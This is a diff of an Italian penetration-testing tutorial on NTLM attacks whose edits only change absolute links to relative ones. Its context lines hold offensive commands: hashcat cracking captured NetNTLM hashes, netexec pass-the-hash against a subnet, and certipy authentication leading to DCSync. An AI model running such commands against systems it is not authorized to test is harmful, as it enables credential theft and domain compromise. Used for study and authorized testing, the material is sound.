@@ -92,7 +92,7 @@ hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt -r /usr/share/has
 hashcat -m 5500 captured_v1.hash /usr/share/wordlists/rockyou.txt
 ```
 
-Vedi: [Responder](https://hackita.it/articoli/responder/)
+Vedi: [Responder](/articoli/responder/)
 
 ***
 
@@ -116,7 +116,7 @@ nxc smb 192.168.1.0/24 -u Administrator -H :32196B56FFE6F45E294117B4292CF797 --l
 
 Il formato standard Impacket è `LM:NT`. Se non hai LM usa `aad3b435b51404eeaad3b435b51404ee` come placeholder (hash LM vuoto universale).
 
-Vedi: [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)
+Vedi: [Pass-the-Hash](/articoli/pass-the-hash/)
 
 ***
 
@@ -180,7 +180,7 @@ certipy-ad auth -pfx dc.pfx -dc-ip 10.10.10.1
 # → NT hash di DC$ → DCSync → tutti gli hash del dominio
 ```
 
-Vedi: [Certipy e ADCS](https://hackita.it/articoli/certipy/) e [NTLM Relay approfondito](https://hackita.it/articoli/ntlm-relay/)
+Vedi: [Certipy e ADCS](/articoli/certipy/) e [NTLM Relay approfondito](/articoli/ntlm-relay/)
 
 ***
 
@@ -265,6 +265,6 @@ nxc smb TARGET -u Administrator -H :HASH --local-auth
 
 ***
 
-###### *Approfondisci anche [Kerberos](https://hackita.it/articoli/kerberos/) per avere una piena conoscenza dei protocolli windows.*
+###### *Approfondisci anche [Kerberos](/articoli/kerberos/) per avere una piena conoscenza dei protocolli windows.*
 
 *MITRE ATT\&CK: T1557.001 (LLMNR/NBT-NS Poisoning), T1550.002 (Pass-the-Hash), T1187 (Forced Authentication), T1003.001 (LSASS Memory), TA0008 (Lateral Movement)*
